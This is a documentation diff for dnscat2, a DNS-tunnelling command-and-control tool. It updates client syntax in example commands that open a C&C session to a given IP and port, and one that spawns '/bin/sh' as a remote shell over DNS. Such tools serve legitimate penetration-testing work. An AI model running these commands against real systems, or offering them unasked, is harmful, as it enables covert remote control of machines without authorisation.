@@ -152,14 +152,14 @@ you get a dnscat2> prompt:
     That's cool, though, you can still use a direct connection!
     Try running this on your client:
     
-    ./dnscat2 --host <server>
+    ./dnscat2 --dns server=<server>
     
     Of course, you have to figure out <server> yourself!
     
     Starting DNS server...
     Starting Dnscat2 DNS server on 0.0.0.0:5133 [domains = n/a]...
     No domains were selected, which means this server will only respond to
-    direct queries (using --host and --port on the client)
+    direct queries (using --dns host=x,port=y on the client)
     
     dnscat2> 
 
@@ -232,7 +232,7 @@ In that example, it will create a C&C session with the dnscat2 server
 running on skullseclabs.org. If an authoritative domain isn't an option,
 it can be given a specific ip address to connect to instead:
 
-    ./dnscat2 --host 206.220.196.59 --port 5353
+    ./dnscat2 --dns host=206.220.196.59,port=5353
 
 Assuming there's a dnscat2 server running on that host/port, it'll
 create a session there.
@@ -330,7 +330,7 @@ course, kill the session).
 You can start a shell directly by running the dnscat client with the
 --exec flag:
 
-    $ ./dnscat --host localhost --port 5133 --exec /bin/sh
+    $ ./dnscat --dns host=localhost,port=5133 --exec /bin/sh
 
 On the server, you'll see a session created as usual:
 
